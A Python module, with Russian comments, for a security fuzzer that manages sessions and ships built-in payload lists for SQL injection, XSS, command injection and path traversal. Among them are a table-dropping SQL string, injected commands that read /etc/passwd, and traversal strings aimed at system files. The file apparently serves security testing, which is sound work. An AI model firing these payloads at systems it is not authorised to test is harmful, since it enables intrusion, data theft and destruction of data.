"""
COS-L10: CapabilityBroker для Fuzzer.

Управление fuzzer-сессией: старт, словари (SQLi, XSS, CMDi, path traversal),
тестовые пейлоады.
"""
from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)


# ── Встроенные словари ──

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "1' AND '1'='1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1#",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "<body onload=alert(1)>",
]

CMDI_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "`id`",
    "$(cat /etc/passwd)",
    "& dir C:\\",
    "| type C:\\Windows\\win.ini",
    "; uname -a",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\Windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....\\\\....\\\\....\\\\Windows\\\\win.ini",
]


@dataclass
class FuzzerSession:
    """Активная fuzzer-сессия."""
    session_id: str
    run_id: str
    dictionaries: dict[str, list[str]] = field(default_factory=dict)
    stats: dict[str, int] = field(default_factory=lambda: {"injected": 0, "hits": 0})


class FuzzerCapabilityBroker:
    """Управление fuzzer-сессией."""

    def __init__(self):
        self._sessions: dict[str, FuzzerSession] = {}

    def start_fuzzer(
        self, run_id: str, dictionaries: list[str] | None = None,
    ) -> FuzzerSession:
        """Запускает fuzzer-сессию с выбранными словарями."""
        if dictionaries is None:
            dictionaries = ["sqli", "xss", "cmdi", "path_traversal"]

        dicts: dict[str, list[str]] = {}
        for name in dictionaries:
            if name == "sqli":
                dicts["sqli"] = SQLI_PAYLOADS.copy()
            elif name == "xss":
                dicts["xss"] = XSS_PAYLOADS.copy()
            elif name == "cmdi":
                dicts["cmdi"] = CMDI_PAYLOADS.copy()
            elif name == "path_traversal":
                dicts["path_traversal"] = PATH_TRAVERSAL_PAYLOADS.copy()

        session = FuzzerSession(
            session_id=f"fuzz-{run_id}-{int(time.time())}",
            run_id=run_id,
            dictionaries=dicts,
        )
        self._sessions[run_id] = session
        total = sum(len(v) for v in dicts.values())
        logger.info(
            "Started fuzzer for run %s: %d dictionaries, %d payloads total",
            run_id, len(dicts), total,
        )
        return session

    def get_payloads(self, session: FuzzerSession, dict_name: str) -> list[str]:
        """Получает пейлоады из словаря."""
        return session.dictionaries.get(dict_name, [])

    def record_injection(self, session: FuzzerSession, hit: bool = False) -> None:
        """Записывает факт инъекции (и попадания)."""
        session.stats["injected"] += 1
        if hit:
            session.stats["hits"] += 1

    def teardown(self, session: FuzzerSession) -> dict[str, int]:
        """Останавливает сессию и возвращает статистику."""
        self._sessions.pop(session.run_id, None)
        logger.info(
            "Fuzzer session %s complete: %d injected, %d hits",
            session.session_id, session.stats["injected"], session.stats["hits"],
        )
        return session.stats